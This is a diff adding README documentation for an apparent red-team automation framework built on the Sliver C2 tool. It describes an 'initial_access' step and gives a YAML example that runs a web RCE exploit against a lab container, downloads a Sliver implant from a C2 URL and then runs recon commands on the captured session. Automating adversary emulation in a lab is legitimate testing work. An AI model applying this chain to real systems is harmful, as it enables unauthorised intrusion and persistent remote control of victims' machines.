@@ -399,6 +399,73 @@ For **lateral movement** you can combine this with:
         group: 1
 ```
 
+### Initial access (`targets` + `initial_access` action)
+
+By default a chain runs against a session you pass to `execute`. The `initial_access`
+action lets a chain *obtain* that first session itself — exploit a target, drop a
+Sliver beacon, and bind the resulting session so later steps use it. This makes true
+end-to-end scenarios (initial access → post-exploitation) expressible in one YAML file.
+
+Declare the hosts under a top-level `targets:` block and reference one by name from an
+`initial_access` step. The new session's UUID is emitted as the step's stdout, so the
+usual `output_var` captures it and downstream steps target it with `session_id: "{{var}}"`:
+
+```yaml
+targets:
+  - name: web1
+    host: 172.20.0.30
+    port: 8080
+    attrs: { path: /ping }          # arbitrary, forwarded to the module
+
+steps:
+  - id: breach
+    action:
+      type: initial_access
+      initial_access:
+        target: web1                 # references targets[].name
+        module: external             # registry key ("external" ships built-in)
+        config:
+          run: '["python3", "/opt/exploits/web_rce.py"]'
+          implant_url: "http://172.20.0.10:8080/api/v1/implant/linux?c2=172.20.0.10"
+        wait:
+          timeout: "240s"            # how long to wait for the beacon (default 120s)
+          match_hostname: "victim-web"  # optional correlation filter
+          match_os: "linux"          # optional correlation filter
+    output_var: web1_session         # <- new session UUID captured here
+    timeout: "300s"                  # must exceed wait.timeout + exploit time
+
+  - id: recon
+    depends_on: [breach]
+    session_id: "{{web1_session}}"
+    action: { type: command, command: { cmd: "id" } }
+```
+
+How the new session is found: the executor snapshots Sliver's sessions before the
+module runs, then polls `GetSessions` until a session that wasn't there before appears
+(and matches the optional `match_hostname` / `match_os` filters), returning its UUID.
+
+**Modules are pluggable.** A module is anything that breaches a target and installs a
+beacon — it never needs to know Sliver's session UUID (the framework correlates that).
+
+- **`external`** (built-in) runs *any* executable/script, so Metasploit (`msfconsole -r`),
+  a custom Python exploit, or a shell one-liner all work without recompiling. Contract:
+  the full request is written as JSON to the child's stdin, and the child prints a JSON
+  result on stdout:
+
+  ```
+  stdin  : {"target": {"name","host","port","attrs"}, "config": {…}}
+  stdout : {"ok": true, "note": "…", "hostname": "…"}   # hostname is an optional hint
+  ```
+
+  If stdout isn't JSON, success is inferred from the process exit code. Config keys:
+  `run` (argv, JSON array or whitespace-split string) or `shell` (a `sh -c` string).
+
+- **Native modules**: implement `initialaccess.Module` (`Name()` + `Run(ctx, Request)`)
+  and register it in `initialaccess.DefaultRegistry()`. Referenced by its `Name()`.
+
+See `examples/initial-access-web.yaml` for a full runnable example against the lab's
+`victim-web` container (`lab/exploits/web_rce.py` is the module script).
+
 ### Condition operators
 
 | Op | Description |
